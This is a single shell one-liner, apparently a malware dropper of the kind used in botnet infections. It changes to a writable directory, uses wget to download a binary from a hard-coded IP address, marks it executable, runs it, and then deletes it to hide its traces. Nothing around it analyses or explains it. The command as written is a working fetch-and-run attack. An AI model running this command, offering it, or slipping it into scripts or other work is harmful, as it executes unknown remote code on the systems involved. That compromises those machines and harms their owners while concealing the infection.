cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://108.61.210.89/[cpu]; chmod +x [cpu]; ./[cpu]; rm -rf [cpu]
